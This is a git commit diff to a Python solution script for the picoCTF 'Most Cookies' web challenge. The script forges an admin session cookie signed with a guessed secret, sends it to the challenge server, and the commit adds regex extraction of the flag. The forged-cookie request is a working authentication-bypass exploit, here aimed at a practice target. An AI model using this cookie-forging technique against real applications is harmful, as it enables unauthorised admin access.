f21938e43f5c0d04cea849e7a3eb00c736814129
mizuirorivi <onodaha@gmail.com>
2023-03-14 08:17:41 -0400

    Add regular expression evaluation to solve challenge

--- picoCTF/web/Most_Cookies/solve.py
+++ picoCTF/web/Most_Cookies/solve.py
@@ -1,6 +1,6 @@
 import requests
 import jwt
-
+import re
 encoded_jwt = jwt.encode({'very_auth': 'admin'}, "fortune", algorithm="HS256")
 print(encoded_jwt)
 encoded_jwt = "eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZBBjOg.M6F3uM1ohKprwQcwY-zyA8A28fI"
@@ -9,5 +9,9 @@ s = requests.Session()
 cookie = {'session': encoded_jwt}
 res = s.get('http://mercury.picoctf.net:65344', cookies=cookie)
 res = s.get('http://mercury.picoctf.net:65344/display', cookies=cookie)
-print(res.text)
-
+pettern = "picoCTF{.*}"
+te = res.text
+for i in te.split():
+    m = re.search(pettern, i)
+    if m:
+        print(m.group(0))
